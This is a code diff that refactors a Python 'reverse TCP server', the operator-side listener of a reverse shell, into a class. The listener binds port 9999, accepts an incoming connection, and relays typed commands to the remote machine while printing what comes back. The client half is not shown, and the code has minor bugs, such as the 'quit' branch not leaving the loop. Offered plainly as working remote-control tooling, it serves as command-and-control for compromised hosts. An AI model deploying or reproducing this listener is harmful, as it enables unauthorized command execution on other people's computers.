@@ -1,51 +1,49 @@
+"""Reverse TCP server script."""
 import socket
-import sys
 
-def socket_create():
-    """Try and create a socket."""
-    try:
-        global host
-        global port
-        global s
-        host = ""
-        port = 9999
-        s = socket.socket()
-    except socket.error as e:
-        return e
 
-def socker_bind():
-    """Binding the socket to the port."""
-    try:
-        global host
-        global port
-        global s
-        s.bind((host, port))
-        s.listen(5)
-    except socket.error as e:
-        return e
+class Server:
+    """Class that holds all the reverse tcp server's methods."""
 
-def socket_accept():
-    """"""
-    conn, address = s.accept()
-    print(f"Connection has been esablished {address[0]}:{str(address[1])}")
-    send_commands(conn)
-    conn.close()
+    def __init__(self, host, port):
+        """Set instance variables."""
+        self.host = host
+        self.port = port
+        try:
+            self.sock = socket.socket()
+        except socket.error as e:
+            return e
 
-def send_commands(conn):
-    while True:
-        cmd = input()
-        if cmd == 'quit':
-            conn.close()
-            s.close()
-            sys.exit()
-        if len(str.encode(cmd)) > 0:
-            conn.send(str.encode(cmd))
-            client_response = str(conn.recv(1024), "utf-8")
-            print(client_response, end="")
+    def bindSocket(self):
+        """Bind port to socket."""
+        try:
+            self.sock.bind((self.host, self.port))
+            self.sock.listen(5)
+        except socket.error as e:
+            return e
 
-def main():
-    socket_create()
-    socker_bind()
-    socket_accept()
+    def acceptSocket(self):
+        """Accept incomming connections."""
+        self.conn, self.address = self.sock.accept()
+        print("Connection has been established: {}:{}".format(
+            self.address[0],
+            str(self.address[1])))
 
-main()
+    def sendCommands(self):
+        """Send commands through the connection, made in self.acceptSocket()."""
+        while True:
+            print("Type 'quit' to exit out this interpreter.")
+            cmd = input()
+            if cmd == "quit":
+                self.conn.close()
+                self.sock.close()
+            if len(str.encode(cmd)) > 0:
+                self.conn.send(str.encode(cmd))
+                clientResponse = str(self.conn.recv(1024), "utf-8")
+                print(clientResponse)
+
+
+reverseTcp = Server("", 9999)
+reverseTcp.bindSocket()
+reverseTcp.acceptSocket()
+reverseTcp.sendCommands()
